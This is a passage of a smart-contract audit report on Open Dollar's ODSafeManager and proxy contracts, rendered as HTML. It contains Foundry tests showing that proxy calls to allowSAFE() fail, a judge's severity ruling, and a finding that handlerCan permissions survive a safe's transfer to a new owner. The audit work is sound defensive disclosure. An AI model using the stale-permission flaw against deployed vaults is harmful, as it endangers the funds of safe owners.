class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">,</span><span class=\"mtk12\">sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// allowSAFE call will fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SafeNotAllowed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">allowSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Function to test open safe and allow safe with proxy delegation call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_allowSafeWithProxyExecute</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cType</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cTypes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safeId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">openSafe2</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cType</span><span class=\"mtk1\">,</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">,</span><span class=\"mtk12\">sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// allowSAFE call will fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">allowSafe</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">safeId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">openSafe2</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payload</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basicActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">openSAFE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safeData</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basicActions</span><span class=\"mtk1\">), </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeData</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">allowSafe</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payload</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allowSAFE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ODProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeManager</span><span class=\"mtk1\">), </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</details>\n<p>Here you can see, both call to the <code>allowSAFE()</code> are failing, ie proxy contract cannot able to allow an address to manage the safe.</p>\n<p>See the second test case, when we are calling the <code>allowSAFE()</code> with <code>delegatecall</code> the context of the target(<code>ODSafeManager</code>) has changed and the call get failed.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement necessary functions in the <code>BasicActions</code> contract to execute necessary functions in the <code>ODSafeManager</code> contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/429#issuecomment-1800716203\">MiloTruck (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Since <code>BasicActions.sol</code> does not have a function to call <code>allowSafe()</code>, users will not be able to interact with <code>ODSafeManager</code> through their proxies.</p>\n<p>However, since this can be addressed operationally by deploying another implementation contract, there isn’t any permanent DOS of the protocol’s functionality. Therefore, medium severity is appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-old-permissions-in-handlercan-mapping-are-still-attached-to-the-safehandler-of-a-transferred-safe\" style=\"position:relative;\"><a href=\"#m-02-old-permissions-in-handlercan-mapping-are-still-attached-to-the-safehandler-of-a-transferred-safe\" aria-label=\"m 02 old permissions in handlercan mapping are still attached to the safehandler of a transferred safe permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/382\">[M-02] Old permissions in handlerCan mapping are still attached to the safeHandler of a transferred safe</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/382\">MrPotatoMagic</a></em></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L41\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L41</a></p>\n<p>A safe is associated with a unique safeHandler. This safeHandler can give permissions to addresses through the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L112\">allowHandler()</a> function which stores these approvals/disapprovals in the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L41\">handlerCan</a> mapping. Now let’s say there is a safeHandler which has permissioned some addresses in the handlerCan mapping. When this safe is transferred to a new owner, the previous permissions that were added to the safeHandler are still attached to it without the new owner realizing it.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here is the whole process:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L112C1-L115C4\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L112C1-L115C4</a></p>\n<ol>\n<li>Safe handler of a safe (owned by owner A) approves addresses [X,Y,Z] to the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L41\">handlerCan</a> mapping through the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L112C1-L115C4\">allowHandler() function</a>.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">allowHandler</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">handlerCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AllowHandler</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<ol start=\"2\">\n<li>Owner A now transfers the safe (associated with the safe handler) to an Owner B through the <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7c8b7a27284f503ce8ae23d63ac9403096dcf6fe/contracts/token/ERC721/ERC721.sol#L152\">safeTransferFrom() function</a> in the Vault721.sol contract which <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L13\">inherits the ERC721Enumerable contract</a> (that inherits the ERC721 contract). During the call, the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L187\">_afterTokenTransfer()</a> hook is called (<a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L187\">overridden in the Vault721.sol contract</a>), which further calls the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136C1-L152C4\">transferSAFEOwnership() function</a>. In the function, we can see that the safe is transferred but the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L41\">handlerCan</a> mapping is not updated for the safeHandler, which means the old permissions (addresses [X,Y,Z]) for the safeHandler are still attached without the new owner B realizing it.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferSAFEOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault721</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;SafeMngr: Only Vault721&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ZeroAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadySafeOwner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">].</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span 